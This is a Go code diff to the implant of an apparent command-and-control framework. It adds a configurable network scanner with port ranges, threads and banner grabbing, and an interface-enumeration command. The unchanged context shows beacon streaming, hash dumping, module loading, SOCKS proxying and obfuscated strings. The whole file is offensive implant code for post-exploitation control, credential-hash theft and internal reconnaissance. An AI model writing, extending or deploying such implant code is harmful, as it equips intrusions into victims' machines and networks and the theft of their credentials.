@@ -63,7 +63,7 @@ func (i *Implant) ExecuteCommand(stream pb.C2Service_BeaconStreamClient, cmd *pb
 		outputStr, err = CaptureScreenshot()
 		output = []byte(outputStr)
 	case pb.CommandMessage_NETWORK_SCAN:
-		output, err = i.NetworkScan(cmd.Args)
+		output, err = i.NetworkScan(cmd.Args, cmd.NetworkScanOptions)
 	case pb.CommandMessage_INFO:
 		output, err = i.GetSystemInfo()
 	case pb.CommandMessage_MODULE_LOAD:
@@ -84,6 +84,8 @@ func (i *Implant) ExecuteCommand(stream pb.C2Service_BeaconStreamClient, cmd *pb
 		output, err = i.HandleDownload(cmd.Args)
 	case pb.CommandMessage_HASHDUMP:
 		output, err = i.DumpHashes()
+	case pb.CommandMessage_IFCONFIG:
+		output, err = i.GetNetworkInterfaces()
 
 	// SOCKS Proxy & Port Forwarding
 	case pb.CommandMessage_SOCKS_START:
@@ -378,23 +380,37 @@ func (i *Implant) TakeScreenshot() ([]byte, error) {
 	return []byte(deobfStr("screenshot_ni")), nil
 }
 
-// NetworkScan performs basic network scanning
-func (i *Implant) NetworkScan(args []string) ([]byte, error) {
+// NetworkScan performs advanced network scanning
+func (i *Implant) NetworkScan(args []string, options *pb.NetworkScanOptions) ([]byte, error) {
+	// If options provided, use them
+	if options != nil {
+		ports := make([]int, len(options.Ports))
+		for i, p := range options.Ports {
+			ports[i] = int(p)
+		}
+
+		scanner := NewScanner(
+			options.TargetRange,
+			ports,
+			options.ScanUdp,
+			int(options.Threads),
+			int(options.TimeoutMs),
+			options.BannerGrab,
+		)
+
+		return scanner.Scan()
+	}
+
+	// Fallback to legacy behavior if no options (or just args provided)
 	if len(args) == 0 {
 		return nil, fmt.Errorf(deobfStr("no_target"))
 	}
 
 	target := args[0]
 
-	// Simple ping test (basic implementation)
-	var cmd *exec.Cmd
-	if runtime.GOOS == "windows" {
-		cmd = exec.Command(deobfStr("ping"), "-n", "1", target)
-	} else {
-		cmd = exec.Command(deobfStr("ping"), "-c", "1", target)
-	}
-
-	return cmd.CombinedOutput()
+	// Use new scanner even for simple scan
+	scanner := NewScanner(target, nil, false, 1, 1000, false)
+	return scanner.Scan()
 }
 
 // GetSystemInfo collects comprehensive system information
@@ -747,4 +763,38 @@ func (i *Implant) dumpLinuxHashes() ([]byte, error) {
 	result += string(content)
 
 	return []byte(result), nil
+}
+
+// GetNetworkInterfaces retrieves network interface information using OS-appropriate commands
+func (i *Implant) GetNetworkInterfaces() ([]byte, error) {
+	var cmd *exec.Cmd
+
+	if runtime.GOOS == "windows" {
+		// Use ipconfig /all on Windows
+		cmd = exec.Command("ipconfig", "/all")
+	} else {
+		// Try ip addr first (modern Linux), fallback to ifconfig (legacy/BSD)
+		cmd = exec.Command("ip", "addr")
+		output, err := cmd.CombinedOutput()
+
+		// If ip command fails, try ifconfig
+		if err != nil {
+			cmd = exec.Command("ifconfig", "-a")
+			output, err = cmd.CombinedOutput()
+			if err != nil {
+				// If both fail, return error
+				return nil, fmt.Errorf("failed to get network interfaces: %v", err)
+			}
+			return output, nil
+		}
+		return output, nil
+	}
+
+	// Execute the command (Windows path)
+	output, err := cmd.CombinedOutput()
+	if err != nil {
+		return nil, fmt.Errorf("failed to get network interfaces: %v", err)
+	}
+
+	return output, nil
 }
